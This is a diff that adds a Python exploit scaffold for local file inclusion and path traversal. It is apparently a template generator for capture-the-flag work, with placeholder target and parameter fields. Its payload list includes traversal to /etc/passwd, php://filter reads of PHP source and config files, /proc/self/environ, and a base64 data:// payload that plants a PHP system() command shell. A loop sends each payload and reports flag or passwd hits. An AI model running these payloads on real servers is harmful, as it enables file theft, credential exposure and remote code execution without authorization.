@@ -1,0 +1,39 @@
+#!/usr/bin/env python3
+# wbx scaffold: LFI / path traversal  ({{LOCATION}})
+# Rule: {{RULE}}   Sink: {{SINK}}   Note: {{NOTE}}
+import urllib.parse
+import urllib.request
+
+BASE = "http://TARGET:PORT"   # TODO
+PARAM = "file"                # TODO: param feeding {{SINK}}
+
+# Ordered by likelihood for CTF. php:// filter first (source disclosure), then flag.
+PAYLOADS = [
+    "/flag.txt",
+    "../../../../flag.txt",
+    "../../../../../../etc/passwd",
+    "php://filter/convert.base64-encode/resource=index.php",  # PHP source read
+    "php://filter/convert.base64-encode/resource=config.php",
+    "/proc/self/environ",
+    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg==",  # data:// RCE if allow_url_include
+]
+
+
+def send(payload: str) -> str:
+    url = f"{BASE}/?{urllib.parse.urlencode({PARAM: payload})}"
+    with urllib.request.urlopen(url, timeout=10) as r:
+        return r.read().decode(errors="replace")
+
+
+def main():
+    for p in PAYLOADS:
+        try:
+            body = send(p)
+            marker = "flag" if "flag" in body.lower() else ("root:" if "root:" in body else "")
+            print(f"[{'+' if marker else '?'}] {p:<55} len={len(body)} {marker}")
+        except Exception as e:
+            print(f"[-] {p:<55} {e}")
+
+
+if __name__ == "__main__":
+    main()
